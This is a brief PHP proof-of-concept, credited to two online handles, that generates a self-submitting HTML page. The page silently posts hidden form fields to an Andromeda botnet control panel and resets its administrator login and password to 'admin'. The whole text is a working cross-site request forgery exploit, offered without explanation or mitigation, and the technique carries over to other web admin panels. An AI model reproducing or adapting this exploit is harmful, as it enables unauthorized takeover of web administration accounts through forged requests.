?php

//POC Change Password Andromeda Botnet
//codded: @Matabarras | @Frenetikk
$url = "web";
$form['newlogin'] = "admin";
$form['newpass1'] = "admin";
$form['newpass2']= "admin";

echo '<html><body onLoad="document.csrf.submit();">';
echo '<form name="csrf" action="http://'.$url.'/nombredeldirectoriobotnet/?act=service&subact=logindata" method="POST">';

foreach($form As $key=>$value) {
	echo '<input type="hidden" name="'.$key.'" value="'.$value.'">';
}
echo '</form></body></html>';
?>
